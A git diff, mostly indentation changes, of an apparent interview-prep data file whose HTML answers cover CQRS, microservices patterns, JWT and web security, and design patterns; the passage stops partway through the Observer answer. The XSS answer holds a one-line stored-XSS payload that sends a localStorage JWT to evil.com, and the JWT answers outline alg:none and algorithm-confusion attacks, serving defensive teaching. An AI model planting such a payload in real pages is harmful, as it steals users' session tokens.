+        q: 'What is the CQRS pattern (Command Query Responsibility Segregation)?',
+        difficulty: 'hard',
+        a: `<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
 <p><strong>Analogy:</strong> A restaurant has two windows:</p>
 <ul>
 <li><strong>Order window</strong> (Command/Write): Place orders, send to kitchen</li>
@@ -892,11 +893,11 @@ Read model (denormalized, optimized for display):
   → Single fast read, no JOINs needed</pre>
 <p>The write DB stays normalized (correct). The read DB is a denormalized projection (fast).</p>
 <div class="key-point">CQRS works great with <strong>Event Sourcing</strong>. Often paired with Kafka: writes go to the write DB, events trigger updates to the read DB. Adds complexity — only use when read/write patterns are very different.</div>`,
-        },
-        {
-          q: 'How would you design a file storage system like Google Drive/Dropbox?',
-          difficulty: 'hard',
-          a: `<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
+      },
+      {
+        q: 'How would you design a file storage system like Google Drive/Dropbox?',
+        difficulty: 'hard',
+        a: `<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
 <p><strong>Key components:</strong></p>
 <pre>Architecture:
   [Client Apps] → [API Gateway] → [Metadata Service] → [Metadata DB]
@@ -927,21 +928,21 @@ Table: chunks
 <p><strong>4. Storage:</strong> Use object storage (AWS S3, GCS) — virtually unlimited, cheap, durable (99.999999999% durability).</p>
 <p><strong>Example:</strong> Dropbox splits files into 4MB blocks, hashes each block, and only uploads blocks that changed. If you edit one paragraph in a 100MB document, only a 4MB chunk is synced.</p>
 <div class="key-point">The magic is in <strong>chunking + deduplication + delta sync</strong>. This is what makes Dropbox fast even on slow connections.</div>`,
-        },
-      ],
-    },
+      },
+    ],
+  },
 
-    // ───────────────────────── ALGORITHMS & DATA STRUCTURES ─────────────────────────
-    // ========================= MICROSERVICES =========================,
-    {
-      id: 'microservices',
-      name: 'Microservices',
-      icon: '🧩',
-      questions: [
-        {
-          q: 'What is microservice architecture and when should you choose it?',
-          difficulty: 'medium',
-          a: `<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
+  // ───────────────────────── ALGORITHMS & DATA STRUCTURES ─────────────────────────
+  // ========================= MICROSERVICES =========================,
+  {
+    id: 'microservices',
+    name: 'Microservices',
+    icon: '🧩',
+    questions: [
+      {
+        q: 'What is microservice architecture and when should you choose it?',
+        difficulty: 'medium',
+        a: `<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
 <pre>Monolith:
   [One Big App: Users + Orders + Payments + Notifications]
 
@@ -963,11 +964,11 @@ Microservices:
 <li>Simple CRUD applications</li>
 </ul>
 <div class="key-point">Start with a well-structured monolith. Extract microservices only when the organizational or scaling pressure is real. Premature microservices is a common and expensive mistake.</div>`,
-        },
-        {
-          q: 'What is service discovery in microservices?',
-          difficulty: 'medium',
-          a: `<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
+      },
+      {
+        q: 'What is service discovery in microservices?',
+        difficulty: 'medium',
+        a: `<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
 <pre>Without service discovery:
   Order Service → http://10.0.1.5:8080/payments  (hardcoded, breaks on scale)
 
@@ -987,11 +988,11 @@ public interface PaymentClient {
 }
 // Eureka resolves "payment-service" to an available instance</pre>
 <div class="key-point">In Kubernetes, service discovery is built-in via DNS. <code>payment-service.default.svc.cluster.local</code> resolves automatically. No need for a separate registry.</div>`,
-        },
-        {
-          q: 'What is the difference between synchronous and asynchronous communication between services?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between synchronous and asynchronous communication between services?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>Synchronous</strong>: Caller sends request and <strong>waits</strong> for response. REST, gRPC.</li>
 <li><strong>Asynchronous</strong>: Caller sends message and <strong>continues</strong> without waiting. Kafka, RabbitMQ, SQS.</li>
 </ul>
@@ -1008,11 +1009,11 @@ publish("order.created", { orderId: 123 })
 <tr><td>Debugging</td><td>Easier (request-response)</td><td>Harder (event chains)</td></tr>
 <tr><td>Use case</td><td>Need immediate answer</td><td>Background processing</td></tr></table>
 <div class="key-point">Use synchronous for user-facing operations that need immediate results. Use asynchronous for background workflows, notifications, and inter-service decoupling.</div>`,
-        },
-        {
-          q: 'Why is database-per-service important in microservices?',
-          difficulty: 'hard',
-          a: `<p>Each service should own its own database so schema changes and deployments stay independent.</p>
+      },
+      {
+        q: 'Why is database-per-service important in microservices?',
+        difficulty: 'hard',
+        a: `<p>Each service should own its own database so schema changes and deployments stay independent.</p>
 <pre>❌ Shared database (distributed monolith):
   Order Service ──→ [Shared DB] ←── Payment Service
   (Schema change in orders table can break payment service!)
@@ -1032,11 +1033,11 @@ publish("order.created", { orderId: 123 })
 <li>Data replication: each service caches what it needs from others</li>
 </ul>
 <div class="key-point">If multiple services directly write the same tables, you usually have a distributed monolith — all the complexity of microservices with none of the benefits.</div>`,
-        },
-        {
-          q: 'What is the BFF pattern in microservices?',
-          difficulty: 'medium',
-          a: `<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
+      },
+      {
+        q: 'What is the BFF pattern in microservices?',
+        difficulty: 'medium',
+        a: `<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
 <pre>Without BFF:
   Mobile App ──→ [Generic API] ←── Web App
   (Mobile gets too much data, web gets too little)
@@ -1060,11 +1061,11 @@ GET /mobile/product/123
 GET /web/product/123
 → { name, price, images[], reviews[], relatedProducts[], specs }</pre>
 <div class="key-point">BFF is especially useful when web and mobile need very different payload shapes. Consider GraphQL as an alternative that can serve multiple clients from one endpoint.</div>`,
-        },
-        {
-          q: 'What is idempotency and why is it important in distributed systems?',
-          difficulty: 'hard',
-          a: `<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
+      },
+      {
+        q: 'What is idempotency and why is it important in distributed systems?',
+        difficulty: 'hard',
+        a: `<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
 <pre>// Idempotent: safe to retry
 PUT /users/123 { name: "John" }  → Always sets name to "John"
 DELETE /orders/456               → First call deletes, retries return 404
@@ -1090,11 +1091,11 @@ if (exists(idempotencyKey)) {
 <li>Load balancers may send duplicate requests</li>
 </ul>
 <div class="key-point">Retries are normal in distributed systems. Idempotency is what keeps retries safe. Stripe, PayPal, and all payment APIs require idempotency keys.</div>`,
-        },
-        {
-          q: 'What is distributed tracing and why do correlation IDs matter?',
-          difficulty: 'medium',
-          a: `<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
+      },
+      {
+        q: 'What is distributed tracing and why do correlation IDs matter?',
+        difficulty: 'medium',
+        a: `<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
 <pre>User request: GET /checkout
   ↓
   [API Gateway] (2ms)
@@ -1121,11 +1122,11 @@ Headers:
 logger.info("[trace=abc-123] Checking inventory for item 789")</pre>
 <p><strong>Tools:</strong> Jaeger, Zipkin, AWS X-Ray, Datadog APM, OpenTelemetry (standard)</p>
 <div class="key-point">Without trace/correlation IDs, debugging latency in microservices is like finding a needle in a haystack. OpenTelemetry is the emerging standard — invest in it early.</div>`,
-        },
-        {
-          q: 'What is the Strangler Fig pattern in microservice migration?',
-          difficulty: 'hard',
-          a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
+      },
+      {
+        q: 'What is the Strangler Fig pattern in microservice migration?',
+        difficulty: 'hard',
+        a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
 <pre>Phase 1: All traffic goes to monolith
   [Users] → [Monolith: Auth + Orders + Reports + Users]
 
@@ -1149,11 +1150,11 @@ Phase N: Monolith is empty → decommission it</pre>
 <li>Keep both running in parallel for rollback safety</li>
 </ol>
 <div class="key-point">Named after the strangler fig tree that grows around a host tree, eventually replacing it. This is far safer than a "big bang" rewrite — you can stop at any point and still have a working system.</div>`,
-        },
-        {
-          q: 'What is the Transactional Outbox pattern?',
-          difficulty: 'hard',
-          a: `<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
+      },
+      {
+        q: 'What is the Transactional Outbox pattern?',
+        difficulty: 'hard',
+        a: `<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
 <pre>// The problem: dual-write inconsistency
 1. Save order to DB ✅
 2. Publish "OrderCreated" to Kafka ❌ (network error!)
@@ -1173,11 +1174,11 @@ Table: outbox
 // Debezium reads DB transaction log → publishes to Kafka
 // No polling needed, near real-time</pre>
 <div class="key-point">The outbox pattern guarantees at-least-once delivery. Consumers must be idempotent. CDC with Debezium is the modern approach — no polling overhead.</div>`,
-        },
-        {
-          q: 'What is the Saga pattern?',
-          difficulty: 'hard',
-          a: `<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
+      },
+      {
+        q: 'What is the Saga pattern?',
+        difficulty: 'hard',
+        a: `<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
 <pre>Order Saga: Create Order → Charge Payment → Reserve Inventory → Confirm
 
 If Inventory fails:
@@ -1203,11 +1204,11 @@ If failure: each service publishes compensation events
 <tr><td>Complexity</td><td>Hard to follow for many steps</td><td>Clear flow in one place</td></tr>
 <tr><td>Best for</td><td>Simple sagas (2-3 steps)</td><td>Complex sagas (5+ steps)</td></tr></table>
 <div class="key-point">Every saga step MUST have a compensating action defined. Without compensation, partial failures leave the system in an inconsistent state.</div>`,
-        },
-        {
-          q: 'What is a service mesh and when would you use one?',
-          difficulty: 'hard',
-          a: `<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
+      },
+      {
+        q: 'What is a service mesh and when would you use one?',
+        difficulty: 'hard',
+        a: `<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
 <pre>Without service mesh:
   Each service handles: retries, circuit breakers, mTLS, tracing, load balancing
   → Duplicated logic in every service, every language
@@ -1231,11 +1232,11 @@ With service mesh (e.g., Istio/Linkerd):
 <li>Polyglot environment (services in different languages)</li>
 </ul>
 <div class="key-point">Service meshes add operational complexity and latency (extra proxy hop). Don't adopt one until you have enough services that manual networking configuration becomes painful. Istio and Linkerd are the most popular options.</div>`,
-        },
-        {
-          q: 'What resilience patterns are commonly used in microservices?',
-          difficulty: 'hard',
-          a: `<ul>
+      },
+      {
+        q: 'What resilience patterns are commonly used in microservices?',
+        difficulty: 'hard',
+        a: `<ul>
 <li><strong>Timeout</strong>: Don't wait forever. Set max wait time for external calls.</li>
 <li><strong>Retry</strong>: Try again on transient failures (with exponential backoff + jitter).</li>
 <li><strong>Circuit Breaker</strong>: Stop calling a failing service. Fail fast instead of cascading.</li>
@@ -1260,11 +1261,11 @@ public PaymentResult paymentFallback(PaymentRequest req, Exception ex) {
 // timeout → open circuit → serve page without recommendations
 // User still sees the page, just without recommendations</pre>
 <div class="key-point">Layer these patterns: Timeout inside Retry inside Circuit Breaker. Never retry without timeouts and limits — retries without backoff can amplify outages (retry storm).</div>`,
-        },
-        {
-          q: 'What is health checking and readiness vs liveness probes?',
-          difficulty: 'medium',
-          a: `<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
+      },
+      {
+        q: 'What is health checking and readiness vs liveness probes?',
+        difficulty: 'medium',
+        a: `<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
 <ul>
 <li><strong>Liveness probe</strong>: "Is the process alive?" If it fails, the container is <strong>restarted</strong>.</li>
 <li><strong>Readiness probe</strong>: "Can it handle traffic?" If it fails, traffic is <strong>removed</strong> from load balancer (but container keeps running).</li>
@@ -1288,20 +1289,20 @@ readinessProbe:
 # /actuator/health/liveness → checks process is alive
 # /actuator/health/readiness → checks DB connection, disk space, etc.</pre>
 <div class="key-point">A common mistake: putting DB checks in the liveness probe. If the DB is temporarily down, all service instances restart in a loop (crash cascade). Put DB checks in readiness probe instead.</div>`,
-        },
-      ],
-    },
+      },
+    ],
+  },
 
-    // ========================= SECURITY & JWT =========================,
-    {
-      id: 'security-jwt',
-      name: 'Security & JWT',
-      icon: '🔒',
-      questions: [
-        {
-          q: 'What is JWT and what are its three parts?',
-          difficulty: 'easy',
-          a: `<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
+  // ========================= SECURITY & JWT =========================,
+  {
+    id: 'security-jwt',
+    name: 'Security & JWT',
+    icon: '🔒',
+    questions: [
+      {
+        q: 'What is JWT and what are its three parts?',
+        difficulty: 'easy',
+        a: `<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
 <pre>// JWT structure: header.payload.signature
 eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT4fwpM
 
@@ -1315,11 +1316,11 @@ Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
 <li><strong>Signature</strong>: ensures token hasn't been tampered with</li>
 </ul>
 <div class="key-point">JWT is Base64-encoded, NOT encrypted. Anyone can decode and read the payload. Never put passwords or sensitive data in the payload. The signature only guarantees integrity, not confidentiality.</div>`,
-        },
-        {
-          q: 'What is the difference between access tokens and refresh tokens?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between access tokens and refresh tokens?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>Access token</strong>: short-lived (5-30 min), sent with every API request, used for authorization.</li>
 <li><strong>Refresh token</strong>: long-lived (days-weeks), used ONLY to get new access tokens, stored more securely.</li>
 </ul>
@@ -1341,11 +1342,11 @@ Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
 <li>Detect refresh token reuse (indicates theft)</li>
 </ul>
 <div class="key-point">If an attacker steals an access token, the damage is limited to its lifetime (minutes). If they steal a refresh token, you can revoke it server-side. This is why refresh tokens need stronger protection.</div>`,
-        },
-        {
-          q: 'Where should JWT be stored in the browser?',
-          difficulty: 'hard',
-          a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+      },
+      {
+        q: 'Where should JWT be stored in the browser?',
+        difficulty: 'hard',
+        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
 <tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Storage</th><th style="padding:6px;border-bottom:1px solid #ccc;">XSS Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">CSRF Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">Survives Refresh</th></tr>
 <tr><td style="padding:6px;">localStorage</td><td style="padding:6px;">❌ High (JS accessible)</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">✅ Yes</td></tr>
 <tr><td style="padding:6px;">HttpOnly Cookie</td><td style="padding:6px;">✅ Safe (JS can't read)</td><td style="padding:6px;">❌ Needs SameSite/CSRF token</td><td style="padding:6px;">✅ Yes</td></tr>
@@ -1363,11 +1364,11 @@ Set-Cookie: refreshToken=xyz;
   Path=/api/refresh; // only sent to refresh endpoint
   Max-Age=604800     // 7 days</pre>
 <div class="key-point">The strongest default: short-lived access tokens in memory + refresh tokens in HttpOnly cookies. This protects against both XSS (can't steal from memory/HttpOnly) and CSRF (SameSite).</div>`,
-        },
-        {
-          q: 'How do you validate JWT securely on the backend?',
-          difficulty: 'hard',
-          a: `<pre>// JWT validation checklist:
+      },
+      {
+        q: 'How do you validate JWT securely on the backend?',
+        difficulty: 'hard',
+        a: `<pre>// JWT validation checklist:
 1. Verify SIGNATURE with the correct key/secret
 2. Check EXPIRATION (exp claim) — reject expired tokens
 3. Check NOT-BEFORE (nbf claim) — reject if before activation
@@ -1395,11 +1396,11 @@ Claims claims = Jwts.parserBuilder()
 // Always whitelist: .setAllowedClockSkewSeconds(30)
 //                    .require("alg", "RS256")</pre>
 <div class="key-point">Never trust a decoded token unless the signature and ALL claims are verified. The most dangerous mistake: accepting <code>alg: none</code> or using the wrong key type.</div>`,
-        },
-        {
-          q: 'What are common JWT security vulnerabilities?',
-          difficulty: 'hard',
-          a: `<ol>
+      },
+      {
+        q: 'What are common JWT security vulnerabilities?',
+        difficulty: 'hard',
+        a: `<ol>
 <li><strong>Algorithm confusion</strong>: Attacker changes RS256→HS256, uses public key as HMAC secret. Fix: whitelist algorithms.</li>
 <li><strong>Weak signing secret</strong>: Short secrets can be brute-forced. Fix: use 256+ bit random secrets or asymmetric keys.</li>
 <li><strong>Long token lifetime</strong>: Stolen tokens valid for hours/days. Fix: short-lived access tokens (5-15 min).</li>
@@ -1414,11 +1415,11 @@ Claims claims = Jwts.parserBuilder()
 // Server using "flexible" algorithm verification → accepts it!
 // Fix: ALWAYS enforce expected algorithm on the server</pre>
 <div class="key-point">Most JWT problems come from implementation mistakes, not from the token format itself. Use well-maintained libraries (jose, jjwt, jsonwebtoken) and follow their security guides.</div>`,
-        },
-        {
-          q: 'How do you handle logout or revocation with JWT?',
-          difficulty: 'hard',
-          a: `<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
+      },
+      {
+        q: 'How do you handle logout or revocation with JWT?',
+        difficulty: 'hard',
+        a: `<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
 <pre>// Strategy 1: Short-lived access tokens (simplest)
 Access token: 5-15 minutes
 → After logout, token expires quickly on its own
@@ -1445,11 +1446,11 @@ JWT payload: { userId: 123, tokenVersion: 5 }
 On logout: increment tokenVersion to 6
 → All existing tokens with version 5 become invalid</pre>
 <div class="key-point">The practical approach: short-lived access tokens (5 min) + revocable server-side refresh tokens. Immediate logout everywhere needs a revocation store (Redis blacklist or token versioning).</div>`,
-        },
-        {
-          q: 'What is the difference between OAuth 2.0 and JWT?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between OAuth 2.0 and JWT?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>OAuth 2.0</strong>: an <strong>authorization framework</strong> that defines flows for granting access. It specifies WHO can access WHAT.</li>
 <li><strong>JWT</strong>: a <strong>token format</strong> that encodes claims as JSON. It's a container, not a protocol.</li>
 </ul>
@@ -1466,11 +1467,11 @@ JWT can be used outside OAuth:
 OAuth 2.0 Authorization Server → issues JWT access tokens
 Resource Server → validates JWT without calling auth server</pre>
 <div class="key-point">OAuth 2.0 is the "process" (how to get a token). JWT is the "envelope" (what the token looks like). They're complementary, not competing.</div>`,
-        },
-        {
-          q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
-          difficulty: 'medium',
-          a: `<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
+      },
+      {
+        q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
+        difficulty: 'medium',
+        a: `<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
 <pre>OAuth 2.0 alone:
   "This app can access your Google Drive photos"
   → Authorization (access to resources)
@@ -1499,11 +1500,11 @@ OIDC adds:
   "exp": 1699999999
 }</pre>
 <div class="key-point">When someone says "Login with Google/GitHub/Microsoft", that's OIDC in action. OAuth 2.0 handles the authorization, OIDC adds the user identity on top.</div>`,
-        },
-        {
-          q: 'What is the difference between RBAC and ABAC?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between RBAC and ABAC?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>RBAC (Role-Based Access Control)</strong>: permissions granted based on user's role.</li>
 <li><strong>ABAC (Attribute-Based Access Control)</strong>: permissions based on attributes of user, resource, environment.</li>
 </ul>
@@ -1529,11 +1530,11 @@ ALLOW if:
 <tr><td>Scalability</td><td>Role explosion risk</td><td>Scales with policies</td></tr>
 <tr><td>Best for</td><td>Most web apps</td><td>Healthcare, finance, government</td></tr></table>
 <div class="key-point">Start with RBAC for most applications. Move to ABAC when you need rules like "users can only edit their own department's documents during business hours."</div>`,
-        },
-        {
-          q: 'What is the difference between CORS and CSRF?',
-          difficulty: 'medium',
-          a: `<p>Two completely different security concepts that are often confused:</p>
+      },
+      {
+        q: 'What is the difference between CORS and CSRF?',
+        difficulty: 'medium',
+        a: `<p>Two completely different security concepts that are often confused:</p>
 <ul>
 <li><strong>CORS (Cross-Origin Resource Sharing)</strong>: A browser security <strong>mechanism</strong> that controls which origins can make requests to your API.</li>
 <li><strong>CSRF (Cross-Site Request Forgery)</strong>: An <strong>attack</strong> where a malicious site tricks a user's browser into making unwanted requests to your API.</li>
@@ -1559,11 +1560,11 @@ Access-Control-Allow-Headers: Authorization, Content-Type
 // - CSRF tokens (random token in form, verified server-side)
 // - Check Origin/Referer headers</pre>
 <div class="key-point">CORS is a protection mechanism (allow/block). CSRF is an attack pattern (exploit). CORS alone does NOT prevent CSRF. You need SameSite cookies or CSRF tokens.</div>`,
-        },
-        {
-          q: 'What is XSS and why does it matter for token-based auth?',
-          difficulty: 'hard',
-          a: `<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
+      },
+      {
+        q: 'What is XSS and why does it matter for token-based auth?',
+        difficulty: 'hard',
+        a: `<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
 <pre>// Three types:
 1. Stored XSS: malicious script saved in DB, served to all users
    Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;
@@ -1589,11 +1590,11 @@ document.cookie  // can't read HttpOnly cookies ✅
 <li><strong>Never use</strong>: <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>eval()</code> with user input</li>
 </ul>
 <div class="key-point">Even with HttpOnly cookies, XSS can act AS the user (make API calls, change data). XSS prevention is critical regardless of token storage strategy.</div>`,
-        },
-        {
-          q: 'What is mTLS and when would you use it between services?',
-          difficulty: 'hard',
-          a: `<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
+      },
+      {
+        q: 'What is mTLS and when would you use it between services?',
+        difficulty: 'hard',
+        a: `<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
 <pre>Regular TLS (HTTPS):
   Client → verifies server certificate → encrypted connection
   Server doesn't verify client identity
@@ -1619,11 +1620,11 @@ mTLS:
 // Istio/Linkerd inject sidecar proxies that handle certificates
 // No code changes needed in your services</pre>
 <div class="key-point">JWT proves user context (who is the user). mTLS proves service identity (which service is calling). They solve different problems and are often used together: mTLS between services + JWT for user context.</div>`,
-        },
-        {
-          q: 'What is the difference between symmetric and asymmetric JWT signing?',
-          difficulty: 'hard',
-          a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+      },
+      {
+        q: 'What is the difference between symmetric and asymmetric JWT signing?',
+        difficulty: 'hard',
+        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
 <tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Aspect</th><th style="padding:6px;border-bottom:1px solid #ccc;">Symmetric (HS256)</th><th style="padding:6px;border-bottom:1px solid #ccc;">Asymmetric (RS256)</th></tr>
 <tr><td style="padding:6px;">Keys</td><td style="padding:6px;">One shared secret</td><td style="padding:6px;">Private key + Public key</td></tr>
 <tr><td style="padding:6px;">Sign</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Private key (auth server only)</td></tr>
@@ -1643,11 +1644,11 @@ Verify with PUBLIC key (published at /.well-known/jwks.json)
 GET https://auth.myapp.com/.well-known/jwks.json
 → { "keys": [{ "kty": "RSA", "n": "...", "e": "AQAB" }] }</pre>
 <div class="key-point">Use asymmetric (RS256/ES256) when many services need to verify tokens but only one authority should sign. This is the standard approach for microservices and third-party auth providers.</div>`,
-        },
-        {
-          q: 'How do you protect login endpoints from brute-force attacks?',
-          difficulty: 'medium',
-          a: `<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
+      },
+      {
+        q: 'How do you protect login endpoints from brute-force attacks?',
+        difficulty: 'medium',
+        a: `<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
 <p><strong>Defense layers:</strong></p>
 <ul>
 <li><strong>Rate limiting</strong>: Max 5 attempts per account per 15 minutes</li>
@@ -1673,20 +1674,20 @@ if (attempts > 5) {
 String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
 // 12 rounds → ~250ms per hash → brute force is impractical</pre>
 <div class="key-point">Do not rely on account lockout alone — attackers can lock out legitimate users (denial of service). Combine rate limiting + progressive delays + MFA for robust protection.</div>`,
-        },
-      ],
-    },
+      },
+    ],
+  },
 
-    // ========================= DESIGN PATTERNS =========================,
-    {
-      id: 'design-patterns',
-      name: 'Design Patterns',
-      icon: '🧩',
-      questions: [
-        {
-          q: 'What is a design pattern and why does it matter?',
-          difficulty: 'easy',
-          a: `<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
+  // ========================= DESIGN PATTERNS =========================,
+  {
+    id: 'design-patterns',
+    name: 'Design Patterns',
+    icon: '🧩',
+    questions: [
+      {
+        q: 'What is a design pattern and why does it matter?',
+        difficulty: 'easy',
+        a: `<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
 <ul>
 <li>It gives a shared vocabulary.</li>
 <li>It improves maintainability when used appropriately.</li>
@@ -1709,11 +1710,11 @@ class SmsSender implements NotificationSender {
     }
 }</pre>
 <div class="key-point">Patterns are tools, not goals. Overusing them can make simple code harder to understand.</div>`,
-        },
-        {
-          q: 'What is the Singleton pattern and what are its risks?',
-          difficulty: 'medium',
-          a: `<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
+      },
+      {
+        q: 'What is the Singleton pattern and what are its risks?',
+        difficulty: 'medium',
+        a: `<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
 <ul>
 <li>Useful for shared configuration or one-off coordinators.</li>
 <li>Risks: hidden global state, hard testing, tight coupling.</li>
@@ -1732,11 +1733,11 @@ public enum AppConfig {
 // Usage:
 String env = AppConfig.INSTANCE.getEnv();</pre>
 <div class="key-point">In Java, enum-based singleton is the safest common implementation.</div>`,
-        },
-        {
-          q: 'What is the Factory Method pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
+      },
+      {
+        q: 'What is the Factory Method pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
 <pre>interface PaymentGateway {
     void pay(int amount);
 }
@@ -1761,11 +1762,11 @@ class PaymentGatewayFactory {
     }
 }</pre>
 <div class="key-point">Use it when creation logic varies and you want calling code to depend on abstractions.</div>`,
-        },
-        {
-          q: 'What is the difference between Factory Method and Abstract Factory?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between Factory Method and Abstract Factory?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>Factory Method</strong>: creates one product type.</li>
 <li><strong>Abstract Factory</strong>: creates a family of related products.</li>
 </ul>
@@ -1795,11 +1796,11 @@ class LightUiFactory implements UiFactory {
     public Dialog createDialog() { return new LightDialog(); }
 }</pre>
 <div class="key-point">Abstract Factory is useful when several objects must match, such as a theme-specific button, dialog, and input.</div>`,
-        },
-        {
-          q: 'What is the Builder pattern and why is it useful?',
-          difficulty: 'easy',
-          a: `<p><strong>Builder</strong> constructs complex objects step by step.</p>
+      },
+      {
+        q: 'What is the Builder pattern and why is it useful?',
+        difficulty: 'easy',
+        a: `<p><strong>Builder</strong> constructs complex objects step by step.</p>
 <ul>
 <li>Improves readability.</li>
 <li>Avoids long constructors with many optional arguments.</li>
@@ -1834,11 +1835,11 @@ User user = new User.Builder()
     .role("ADMIN")
     .build();</pre>
 <div class="key-point">Builder is ideal when parameter count grows and constructor calls become hard to read safely.</div>`,
-        },
-        {
-          q: 'What is the Strategy pattern and when do you use it?',
-          difficulty: 'easy',
-          a: `<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
+      },
+      {
+        q: 'What is the Strategy pattern and when do you use it?',
+        difficulty: 'easy',
+        a: `<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
 <pre>interface DiscountStrategy {
     double apply(double price);
 }
@@ -1863,11 +1864,11 @@ class CheckoutService {
     }
 }</pre>
 <div class="key-point">Strategy is great for removing large if/else blocks around changing business rules.</div>`,
-        },
-        {
-          q: 'What is the difference between Strategy and State?',
-          difficulty: 'hard',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between Strategy and State?',
+        difficulty: 'hard',
+        a: `<ul>
 <li><strong>Strategy</strong>: choose one behavior among alternatives.</li>
 <li><strong>State</strong>: behavior changes based on current lifecycle state.</li>
 </ul>
@@ -1897,11 +1898,11 @@ class Order {
     void next() { state.next(this); }
 }</pre>
 <div class="key-point">If behavior depends on object lifecycle transitions, it is usually State, not Strategy.</div>`,
-        },
-        {
-          q: 'What is the Observer pattern?',
-          difficulty: 'easy',
-          a: `<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
+      },
+      {
+        q: 'What is the Observer pattern?',
+        difficulty: 'easy',
+        a: `<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
 <pre>interface Observer {
     void update(String event);
 }
